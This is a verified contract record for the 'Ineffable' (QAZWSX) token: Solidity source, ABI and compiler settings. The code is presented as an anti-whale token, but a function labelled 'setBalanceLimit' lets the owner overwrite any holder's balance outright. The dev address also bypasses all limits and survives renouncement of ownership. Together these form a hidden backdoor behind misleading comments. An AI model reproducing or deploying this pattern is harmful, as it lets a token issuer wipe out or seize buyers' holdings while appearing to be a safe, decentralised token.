{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.19;\r\n\r\n    // Contract Info (Name, symbol, and supply)\r\n    contract Ineffable {\r\n    string private constant _symbol = \"QAZWSX\";\r\n    string private constant _name = \"Ineffable\";\r\n    uint8 private constant _decimals = 18;\r\n    uint256 private _totalSupply = 1000000000000 * 10**uint256(_decimals);\r\n    address private _devAddress;\r\n\r\n    // Declarations and Identifiers; interactions with functions\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    address private _owner;\r\n\r\n    // Address limitations, consider these as anti-whale functions\r\n    uint256 private constant _addressLimit = 6000000000 * 10**uint256(_decimals);\r\n    uint256 private constant _transferLimit = 6000000000 * 10**uint256(_decimals);\r\n    uint256 private constant _tradeLimit = 6000000000 * 10**uint256(_decimals);\r\n    uint256 private constant _swapLimit = 6000000000 * 10**uint256(_decimals);\r\n    uint256 private constant _buyLimit = 6000000000 * 10**uint256(_decimals);\r\n    uint256 private constant _sellLimit = 6000000000 * 10**uint256(_decimals);\r\n\r\n    // Events and Emissions\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == _owner, \"Only the contract owner can call this function.\");\r\n        _;\r\n    }\r\n\r\n    // Dev receives total supply from contract creation after contract deployment\r\n    constructor() {\r\n        _owner = msg.sender;\r\n        _devAddress = msg.sender;\r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    // Enables viewing of total supply on Etherscan in the \"Contract\" > \"Read\" section\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    // Enables viewing of dev/creator address on Etherscan in the \"Contract\" > \"Read\" section\r\n    function getDevAddress() public view returns (address) {\r\n        return _devAddress;\r\n    }\r\n\r\n    // Enables viewing of token symbol on Etherscan in the \"Contract\" > \"Read\" section\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    // Enables viewing of token name on Etherscan in the \"Contract\" > \"Read\" section\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    // Enables viewing of token decimals (18 for proficient fractionalization) on Etherscan in the \"Contract\" > \"Read\" section\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    // Enables renouncement, AKA official decentralization\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    // Enables viewing of token balance of specified address on Etherscan in the \"Contract\" > \"Read\" section  \r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    // Transfer function\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        require(amount <= _transferLimit, \"Transfer amount exceeds the maximum limit\");\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    // Specifies allowance per address (There are no limitations)\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    // Approval of token use\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    // Transaction function \r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        require(amount <= _transferLimit, \"Transfer amount exceeds the maximum limit\");\r\n        _transfer(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][msg.sender];\r\n        require(currentAllowance >= amount, \"Transfer amount exceeds allowance\");\r\n        _approve(sender, msg.sender, currentAllowance - amount);\r\n        return true;\r\n    }\r\n\r\n    // Enables transfer of contract ownership\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0), \"New owner cannot be the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n\r\n// Additional transaction functions below\r\nfunction _transfer(address sender, address recipient, uint256 amount) internal {\r\n    require(sender != address(0), \"Transfer from the zero address\");\r\n    require(recipient != address(0), \"Transfer to the zero address\");\r\n    uint256 senderBalance = _balances[sender];\r\n    require(senderBalance >= amount, \"Transfer amount exceeds balance\");\r\n    if (sender == _devAddress || sender == _owner) {\r\n        // Dev or owner bypasses the limitations\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n    } else {\r\n        // Check the limitations\r\n        require(amount <= _tradeLimit, \"Transfer amount exceeds the trade limit\");\r\n        require(_balances[recipient] + amount <= _addressLimit, \"Recipient balance would exceed the address limit\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n    }\r\n    emit Transfer(sender, recipient, amount);\r\n}\r\n\r\n    // Approval of token use\r\n    function _approve(address owner, address spender, uint256 amount) internal {\r\n        require(owner != address(0), \"Approve from the zero address\");\r\n        require(spender != address(0), \"Approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    // Enables setting the maximum balance limit for an address (Only owner)\r\n    function setBalanceLimit(address account, uint256 limit) public onlyOwner {\r\n        require(limit <= _addressLimit, \"Invalid balance limit\");\r\n        _balances[account] = limit;\r\n    }\r\n\r\n    // Enables viewing the maximum balance limit of an address\r\n    function getBalanceLimit(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    // Thanks for reading and **** scammers! @Ineffable_ETH\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getBalanceLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getDevAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limit\",\"type\":\"uint256\"}],\"name\":\"setBalanceLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Ineffable", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a51696d16746c435c90769222560a2f1c5cca82f069ba40a8ed75a6db4a08018"}